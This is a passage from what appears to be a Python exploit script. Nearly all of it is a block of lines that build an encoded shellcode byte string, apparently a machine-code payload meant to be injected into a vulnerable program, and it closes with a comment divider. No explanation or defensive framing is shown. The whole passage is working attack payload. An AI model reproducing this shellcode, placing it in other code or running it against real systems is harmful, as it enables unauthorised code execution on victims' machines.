...
shellcode += b"\x5e\x81\x76\x0e\x92\xc8\x45\x1e\x83\xee\xfc"
shellcode += b"\xe2\xf4\x6e\x20\xc7\x1e\x92\xc8\x25\x97\x77"
shellcode += b"\xf9\x85\x7a\x19\x98\x75\x95\xc0\xc4\xce\x4c"
shellcode += b"\x86\x43\x37\x36\x9d\x7f\x0f\x38\xa3\x37\xe9"
shellcode += b"\x22\xf3\xb4\x47\x32\xb2\x09\x8a\x13\x93\x0f"
shellcode += b"\xa7\xec\xc0\x9f\xce\x4c\x82\x43\x0f\x22\x19"
shellcode += b"\x84\x54\x66\x71\x80\x44\xcf\xc3\x43\x1c\x3e"
shellcode += b"\x93\x1b\xce\x57\x8a\x2b\x7f\x57\x19\xfc\xce"
shellcode += b"\x1f\x44\xf9\xba\xb2\x53\x07\x48\x1f\x55\xf0"
shellcode += b"\xa5\x6b\x64\xcb\x38\xe6\xa9\xb5\x61\x6b\x76"
shellcode += b"\x90\xce\x46\xb6\xc9\x96\x78\x19\xc4\x0e\x95"
shellcode += b"\xca\xd4\x44\xcd\x19\xcc\xce\x1f\x42\x41\x01"
shellcode += b"\x3a\xb6\x93\x1e\x7f\xcb\x92\x14\xe1\x72\x97"
shellcode += b"\x1a\x44\x19\xda\xae\x93\xcf\xa0\x76\x2c\x92"
shellcode += b"\xc8\x2d\x69\xe1\xfa\x1a\x4a\xfa\x84\x32\x38"
shellcode += b"\x95\x37\x90\xa6\x02\xc9\x45\x1e\xbb\x0c\x11"
shellcode += b"\x4e\xfa\xe1\xc5\x75\x92\x37\x90\x4e\xc2\x98"
shellcode += b"\x15\x5e\xc2\x88\x15\x76\x78\xc7\x9a\xfe\x6d"
shellcode += b"\x1d\xd2\x74\x97\xa0\x4f\x14\x9c\x62\x2d\x1c"
shellcode += b"\x92\xc9\xfe\x97\x74\xa2\x55\x48\xc5\xa0\xdc"
shellcode += b"\xbb\xe6\xa9\xba\xcb\x17\x08\x31\x12\x6d\x86"
shellcode += b"\x4d\x6b\x7e\xa0\xb5\xab\x30\x9e\xba\xcb\xfa"
shellcode += b"\xab\x28\x7a\x92\x41\xa6\x49\xc5\x9f\x74\xe8"
shellcode += b"\xf8\xda\x1c\x48\x70\x35\x23\xd9\xd6\xec\x79"
shellcode += b"\x1f\x93\x45\x01\x3a\x82\x0e\x45\x5a\xc6\x98"
shellcode += b"\x13\x48\xc4\x8e\x13\x50\xc4\x9e\x16\x48\xfa"
shellcode += b"\xb1\x89\x21\x14\x37\x90\x97\x72\x86\x13\x58"
shellcode += b"\x6d\xf8\x2d\x16\x15\xd5\x25\xe1\x47\x73\xa5"
shellcode += b"\x03\xb8\xc2\x2d\xb8\x07\x75\xd8\xe1\x47\xf4"
shellcode += b"\x43\x62\x98\x48\xbe\xfe\xe7\xcd\xfe\x59\x81"
shellcode += b"\xba\x2a\x74\x92\x9b\xba\xcb"
# ------------------------------------------------------------------------
